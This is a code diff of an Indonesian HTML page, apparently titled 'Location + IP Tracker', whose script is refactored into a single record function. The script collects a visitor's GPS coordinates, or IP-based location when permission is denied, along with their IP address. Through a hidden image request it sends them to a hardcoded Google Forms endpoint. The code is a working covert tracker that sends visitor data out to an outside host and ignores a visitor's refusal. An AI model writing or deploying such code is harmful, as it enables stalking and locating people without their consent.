@@ -2,12 +2,11 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8"/>
-  <title>Tracker Lokasi + IP (Fixed)</title>
+  <title>Tracker Lokasi + IP (Final)</title>
 </head>
 <body>
   <h2>Sedang merekam lokasi…</h2>
   <script>
-    // —– Konfigurasi FormResponse & Entry IDs —–
     const FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSdmCzOfz6cYaPXncwwhYKyeRX_ZUP6YhMmMWYKSSkGreLrURQ/formResponse';
     const F = {
       lat:  'entry.336954328',
@@ -20,77 +19,69 @@
     };
 
     function submit(params) {
-      // Kirim ke Google Form
       new Image().src = FORM_URL + '?' + new URLSearchParams(params);
     }
 
-    function doSubmit(lat, lon, acc, city, reg, country, ip) {
-      const p = {
-        [F.lat]:  lat,
-        [F.long]: lon,
-        [F.acc]:  acc,
-        [F.ip]:   ip
-      };
-      if (city)    p[F.city] = city;
-      if (reg)     p[F.reg]  = reg;
-      if (country) p[F.id]   = country;
-      submit(p);
-    }
-
-    // Fallback sequence: IP + geo aproksimasi
-    function fallback() {
-      // Pertama, ambil IP
-      fetch('https://api.ipify.org?format=json')
+    function record(pos) {
+      fetch('https://ipwho.is/json/')
         .then(r => r.json())
-        .then(({ ip }) => {
-          // Lalu, ambil aproksimasi lokasi
-          fetch('https://ipwho.is/json/')
-            .then(r => r.json())
-            .then(d => {
-              doSubmit(
-                d.latitude ?? 0,
-                d.longitude ?? 0,
-                'IP',
-                d.city,
-                d.region,
-                d.country,
-                ip
-              );
-            })
-            .catch(() => {
-              // Kalau ipwho.is gagal, kirim minimal IP
-              doSubmit(0, 0, 'IP', '', '', '', ip);
-            });
+        .then(d => {
+          const ip      = d.ip;
+          const lat     = pos?.coords ? pos.coords.latitude  : d.latitude;
+          const lon     = pos?.coords ? pos.coords.longitude : d.longitude;
+          const acc     = pos?.coords ? pos.coords.accuracy  : 'IP';
+          const city    = d.city;
+          const region  = d.region;
+          const country = d.country;
+          submit({
+            [F.lat]:  lat,
+            [F.long]: lon,
+            [F.acc]:  acc,
+            [F.city]: city,
+            [F.reg]:  region,
+            [F.id]:   country,
+            [F.ip]:   ip
+          });
         })
         .catch(() => {
-          // Kalau ipify gagal, set IP ‘unknown’
-          doSubmit(0, 0, 'IP', '', '', '', 'unknown');
+          // Kalau ipwho.is gagal, fallback ambil IP saja via ipify
+          fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(j => {
+              const ip = j.ip;
+              const lat = pos?.coords ? pos.coords.latitude  : '';
+              const lon = pos?.coords ? pos.coords.longitude : '';
+              const acc = pos?.coords ? pos.coords.accuracy  : 'unknown';
+              submit({
+                [F.lat]:  lat,
+                [F.long]: lon,
+                [F.acc]:  acc,
+                [F.ip]:   ip
+              });
+            })
+            .catch(() => {
+              // Jika benar-benar gagal, kirim minimal saja
+              const lat = pos?.coords ? pos.coords.latitude  : '';
+              const lon = pos?.coords ? pos.coords.longitude : '';
+              const acc = pos?.coords ? pos.coords.accuracy  : 'error';
+              submit({
+                [F.lat]:  lat,
+                [F.long]: lon,
+                [F.acc]:  acc,
+                [F.ip]:   'unknown'
+              });
+            });
         });
     }
 
-    // Kalau GPS dijinkan
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
-        pos => {
-          const { latitude, longitude, accuracy } = pos.coords;
-          // Ambil IP saja lalu kirim GPS+IP
-          fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(({ ip }) => {
-              doSubmit(latitude, longitude, accuracy, '', '', '', ip);
-            })
-            .catch(() => {
-              // Kalau IP-fetch gagal, kirim GPS saja
-              doSubmit(latitude, longitude, accuracy, '', '', '', 'unknown');
-            });
-        },
-        // Kalau user tolak atau timeout
-        _err => fallback(),
+        pos => record(pos),   // user Allow
+        _err => record(null), // user Deny / timeout
         { timeout: 8000 }
       );
     } else {
-      // Browser tak support Geolocation
-      fallback();
+      record(null);         // browser tak support
     }
   </script>
 </body>
